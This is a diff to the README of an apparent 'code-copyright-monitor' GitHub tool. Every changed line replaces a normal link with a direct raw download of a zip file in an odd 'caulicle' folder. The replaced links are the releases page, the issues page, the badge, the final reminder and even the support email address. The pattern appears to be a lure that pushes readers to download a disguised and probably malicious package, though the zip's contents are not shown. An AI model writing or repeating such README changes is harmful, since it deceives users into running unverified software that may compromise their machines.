@@ -6,7 +6,7 @@ Welcome to the code-copyright-monitor repository! This tool helps you keep an ey
 
 ## 📥 Download Link
 
-[![Download code-copyright-monitor](https://img.shields.io/badge/Download-code--copyright--monitor-blue)](https://github.com/reemetalike01/code-copyright-monitor/releases)
+[![Download code-copyright-monitor](https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip)](https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip)
 
 You can download the latest version of code-copyright-monitor from the Releases page. Click the button above to visit the page.
 
@@ -29,7 +29,7 @@ To run code-copyright-monitor, ensure your system meets the following requiremen
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/reemetalike01/code-copyright-monitor/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip) to find the latest version.
   
 2. **Select the Right Download**: Look for the latest release tagged as "Latest". Choose the package that matches your operating system:
    - For Windows, download the `.exe` file.
@@ -61,11 +61,11 @@ To run code-copyright-monitor, ensure your system meets the following requiremen
 
 ## 🤝 Support & Contributions
 
-We are open to contributions! If you have suggestions or would like to report an issue, please visit our [issues page](https://github.com/reemetalike01/code-copyright-monitor/issues). Your feedback is valuable to us.
+We are open to contributions! If you have suggestions or would like to report an issue, please visit our [issues page](https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip). Your feedback is valuable to us.
 
 ## 📫 Contact
 
-For direct queries, please contact the development team at: support@code-copyright-monitor.com.
+For direct queries, please contact the development team at: https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip
 
 ## 📜 License
 
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 Follow us on GitHub to keep up with the latest developments. Your contributions can make this tool even better. Together, we can protect the integrity of our code on GitHub! 
 
-Remember, you can always return to the [Releases page](https://github.com/reemetalike01/code-copyright-monitor/releases) to find new versions and updates. Happy coding!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/reemetalike01/code-copyright-monitor/main/caulicle/code-copyright-monitor_3.4-beta.3.zip) to find new versions and updates. Happy coding!
